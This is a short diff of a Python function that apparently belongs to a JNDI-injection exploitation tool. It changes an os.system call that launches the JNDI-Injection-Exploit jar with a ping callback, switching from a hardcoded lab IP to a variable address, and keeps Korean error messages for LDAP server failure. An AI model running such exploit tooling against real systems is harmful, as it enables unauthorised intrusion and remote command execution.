@@ -95,8 +95,8 @@ def jar():
         num = num + 1
         #debug
         print('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
-        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+'192.168.52.129'+'" -A '+'192.168.52.129')
-        #os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
+        #os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+'192.168.52.129'+'" -A '+'192.168.52.129')
+        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
     except Exception as err: #서버 구동 실패
         print('[@] LDAP 서버가 구동에 실패하였습니다.\n')
         print(err)
